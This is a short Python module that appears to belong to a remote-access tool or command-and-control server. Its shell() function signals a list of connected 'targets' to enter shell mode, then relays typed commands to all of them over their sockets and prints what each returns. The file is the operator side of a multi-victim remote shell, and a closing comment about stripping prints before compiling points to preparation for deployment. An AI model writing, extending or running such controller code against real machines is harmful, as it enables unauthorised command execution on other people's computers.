import server_folder.config as config
from socket import error as socket_error


def shell(server, targets):
    """
    Pops a shell and send commands to the selected clients
    :param server: Server socket object
    :param targets: Client target list
    """
    config.custom_console = 'shell> '

    # Let's the client know that he's about to receive shell commands.
    for target in targets:
        try:
            conn = config.all_connections[target]['data']['socket']
            server.send(conn, 'shell')
        except socket_error:
            print('[!] Connection was lost..')
            config.all_connections.pop(target)  # Delete dead client from the list

    # Sends shell commands.
    stop_flag = False
    while not targets or not stop_flag:
        cmd = input(config.custom_console)
        for target in targets:
            print('target: ', target)
            try:
                conn = config.all_connections[target]['data']['socket']
                # Quits the shell
                if cmd.lower() == 'quit':
                    server.send(conn, 'quit')
                    stop_flag = True
                    break
                server.send(conn, cmd)
                received = server.receive(conn).split('>', 1)
                print(received[1])  # Received shell data
            except socket_error:
                print('[!] Connection was lost..')
                config.all_connections.pop(target)  # Delete dead client from the list
    config.custom_console = 'oSys> '

# Notes:
# Delete custom console + prints before compiling
